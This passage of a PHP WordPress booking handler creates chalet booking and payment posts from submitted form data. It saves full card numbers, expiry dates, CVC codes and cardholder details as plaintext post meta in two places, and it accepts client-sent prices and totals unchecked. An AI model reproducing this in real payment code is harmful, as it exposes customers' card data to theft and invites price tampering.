            wp_die();
        }
    }

    // Validate chalet exists
    $chalet_id = intval($booking['chalet_id']);
    if (!$chalet_id || get_post_type($chalet_id) !== 'chalet') {
        wp_send_json_error(['message' => 'Invalid chalet ID.']);
        wp_die();
    }

    // Validate dates
    $checkin = strtotime($booking['checkin_date']);
    $checkout = strtotime($booking['checkout_date']);
    if (!$checkin || !$checkout || $checkout <= $checkin) {
        wp_send_json_error(['message' => 'Invalid check-in or check-out date.']);
        wp_die();
    }

    // Validate guests
    $adults = intval($booking['adults']);
    $children = isset($booking['children']) ? intval($booking['children']) : 0;
    $infants = isset($booking['infants']) ? intval($booking['infants']) : 0;
    if ($adults < 1) {
        wp_send_json_error(['message' => 'At least one adult is required.']);
        wp_die();
    }

    // Validate email
    $email = sanitize_email($booking['email']);
    if (!is_email($email)) {
        wp_send_json_error(['message' => 'Invalid email address.']);
        wp_die();
    }

    // Prepare post data
    $chalet_title = get_the_title($chalet_id);
    $post_data = [
        'post_type'    => 'booking',
        'post_title'   => 'Booking for ' . $chalet_title . ' - ' . sanitize_text_field($booking['firstName']) . ' ' . sanitize_text_field($booking['lastName']),
        'post_status'  => 'publish',
        'post_author'  => get_current_user_id(),
    ];

    // Insert booking post
    $booking_post_id = wp_insert_post($post_data, true);
    if (is_wp_error($booking_post_id)) {
        wp_send_json_error(['message' => 'Failed to create booking: ' . $booking_post_id->get_error_message()]);
        wp_die();
    }

    // Save meta fields using Carbon Fields
    carbon_set_post_meta($booking_post_id, 'booking_chalet',  $chalet_id);
    carbon_set_post_meta($booking_post_id, 'booking_checkin', date('Y-m-d', $checkin));
    carbon_set_post_meta($booking_post_id, 'booking_checkout', date('Y-m-d', $checkout));
    carbon_set_post_meta($booking_post_id, 'booking_adults', $adults);
    carbon_set_post_meta($booking_post_id, 'booking_children', $children);
    carbon_set_post_meta($booking_post_id, 'booking_babies', $infants);
    carbon_set_post_meta($booking_post_id, 'guest_first_name', sanitize_text_field($booking['firstName']));
    carbon_set_post_meta($booking_post_id, 'guest_last_name', sanitize_text_field($booking['lastName']));
    carbon_set_post_meta($booking_post_id, 'guest_phone', sanitize_text_field($booking['phone']));
    carbon_set_post_meta($booking_post_id, 'guest_email', $email);
    carbon_set_post_meta($booking_post_id, 'guest_language', sanitize_text_field($booking['language'] ?? 'en'));
    carbon_set_post_meta($booking_post_id, 'special_requests', sanitize_textarea_field($booking['comments'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'agree_terms', !empty($booking['accepted_terms']) ? 1 : 0);

    // Addons (array of options)
    $addons = [];
    if (!empty($booking['addons']) && is_array($booking['addons'])) {
        foreach ($booking['addons'] as $addon) {
            $addons[] = [
                'name'  => sanitize_text_field($addon['name'] ?? ''),
                'qty'   => intval($addon['qty'] ?? 0),
                'price' => floatval($addon['price'] ?? 0),
                'total' => floatval($addon['total'] ?? 0),
                'type'  => sanitize_text_field($addon['type'] ?? ''),
                'idx'   => sanitize_text_field($addon['idx'] ?? ''),
            ];
        }
    }
    carbon_set_post_meta($booking_post_id, 'addons', $addons);

    // Payment schedule (array)
    $payment_schedule = [];
    if (!empty($booking['payment_schedule']) && is_array($booking['payment_schedule'])) {
        for ($i=0;$i<count($booking['payment_schedule']);$i++) {
            $payment = $booking['payment_schedule'][$i] ?? [];
            $date = '';
            $chalet_reservation_policy = carbon_get_post_meta($chalet_id, 'reservation_policy');
            if (!empty($chalet_reservation_policy)) {
                // Set payment dates strictly based on reservation_policy and payment index
                switch ($chalet_reservation_policy) {
                    case 'policy_50_50_3':
                        // 1st payment: on agreement (now), 2nd payment: 3 days before check-in
                        if ($i === 0) {
                            $date = current_time('Y-m-d H:i:s');
                        } elseif ($i === 1) {
                            $date = date('Y-m-d H:i:s', strtotime('-3 days', $checkin));
                        }
                        break;
                    case 'policy_50_50_14':
                        // 1st payment: on agreement (now), 2nd payment: 14 days before check-in
                        if ($i === 0) {
                            $date = current_time('Y-m-d H:i:s');
                        } elseif ($i === 1) {
                            $date = date('Y-m-d H:i:s', strtotime('-14 days', $checkin));
                        }
                        break;
                    case 'policy_25_25_50_14':
                        // 1st payment: on agreement (now), 2nd: 14 days before, 3rd: on arrival
                        if ($i === 0) {
                            $date = current_time('Y-m-d H:i:s');
                        } elseif ($i === 1) {
                            $date = date('Y-m-d H:i:s', strtotime('-14 days', $checkin));
                        } elseif ($i === 2) {
                            $date = date('Y-m-d H:i:s', $checkin);
                        }
                        break;
                    default:
                        $date = '';
                }
            }
            $payment_schedule[] = [
                'label'   => sanitize_text_field($payment['label'] ?? ''),
                'desc'    => sanitize_text_field($payment['desc'] ?? ''),
                'percent' => floatval($payment['percent'] ?? 0),
                'amount'  => floatval($payment['amount'] ?? 0),
                'date'    => $date,
            ];
        }
    }
    // carbon_set_post_meta($booking_post_id, 'payment_schedule', $payment_schedule);
    // --- Create Payment CPT and Save Payment Data ---
    // Create a new Payment post (CPT)
    $payment_post = [
        'post_type'   => 'payment',
        'post_title'  => 'Payment for Booking #' . $booking_post_id,
        'post_status' => 'publish',
        'post_author' => get_current_user_id(),
    ];
    $payment_post_id = wp_insert_post($payment_post, true);

    if (!is_wp_error($payment_post_id)) {
        // Link payment to booking
        carbon_set_post_meta($payment_post_id, 'booking_id', $booking_post_id);

        // Card credentials (store only if needed, but generally should NOT store sensitive info)
        $payment_card_fields = [
            'card_number'      => sanitize_text_field($booking['card_number'] ?? ''),
            'card_expiry'      => sanitize_text_field($booking['card_expiry'] ?? ''),
            'card_cvc'         => sanitize_text_field($booking['card_cvc'] ?? ''),
            'card_holder_name' => sanitize_text_field($booking['card_full_name'] ?? ''),
        ];
        foreach ($payment_card_fields as $key => $val) {
            if (!empty($val)) {
                carbon_set_post_meta($payment_post_id, $key, $val);
            }
        }

        // Payment schedule (up to 5 payments)
        if (!empty($payment_schedule)) {
            for ($i = 0; $i < min(5, count($payment_schedule)); $i++) {
                $p = $payment_schedule[$i];
                carbon_set_post_meta($payment_post_id, "payment_" . ($i + 1) . "_amount", $p['amount']);
                carbon_set_post_meta($payment_post_id, "payment_" . ($i + 1) . "_status", 'pending');
                // Optionally set date if available
                if (!empty($p['date'])) {
                    carbon_set_post_meta($payment_post_id, "payment_" . ($i + 1) . "_date", $p['date']);
                }
            }
        }

        // Payment details
        carbon_set_post_meta($payment_post_id, 'total_amount', floatval($booking['total'] ?? 0));
        carbon_set_post_meta($payment_post_id, 'payment_reference', '');
        carbon_set_post_meta($payment_post_id, 'payment_date', current_time('mysql'));
        carbon_set_post_meta($payment_post_id, 'payment_status', 'pending');
        carbon_set_post_meta($payment_post_id, 'payer_name', sanitize_text_field(($booking['firstName'] ?? '') . ' ' . ($booking['lastName'] ?? '')));
        carbon_set_post_meta($payment_post_id, 'payer_email', $email);
        carbon_set_post_meta($payment_post_id, 'payment_notes', sanitize_textarea_field($booking['comments'] ?? ''));


        // update booking post with payment ID
        carbon_set_post_meta($booking_post_id, 'payment_id', $payment_post_id ?? '');
    }

    // Other fields
    carbon_set_post_meta($booking_post_id, 'promo_code', sanitize_text_field($booking['promo_code'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'payment_method', sanitize_text_field($booking['payment_method'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'booking_id', $booking_post_id);
    carbon_set_post_meta($booking_post_id, 'chalet_id', $chalet_id);
    carbon_set_post_meta($booking_post_id, 'booking_status', 'pending');
    carbon_set_post_meta($booking_post_id, 'booking_price', sanitize_text_field($booking['total'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'booking_source', sanitize_text_field($booking['booking_source'] ?? 'website'));
    carbon_set_post_meta($booking_post_id, 'rental_total', sanitize_text_field($booking['rental_total'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'addons_total', floatval($booking['addons_total'] ?? 0));
    carbon_set_post_meta($booking_post_id, 'lodging_tax', sanitize_text_field($booking['lodging_tax'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'admin_fee', sanitize_text_field($booking['admin_fee'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'total_excl_sales_taxes', sanitize_text_field($booking['total_excl_sales_taxes'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'gst', sanitize_text_field($booking['gst'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'qst', sanitize_text_field($booking['qst'] ?? ''));
    carbon_set_post_meta($booking_post_id, 'total', sanitize_text_field($booking['total'] ?? ''));

    // Card info (store only if needed, but generally should NOT store sensitive info)
    $card_fields = ['card_number', 'card_expiry', 'card_cvc', 'card_full_name', 'card_country', 'card_address'];
    foreach ($card_fields as $field) {
        if (!empty($booking[$field])) {
            carbon_set_post_meta($booking_post_id, $field, sanitize_text_field($booking[$field]));
        }
    }

    // continue processing $booking...
    wp_send_json_success(['message' => 'Received!']);
}
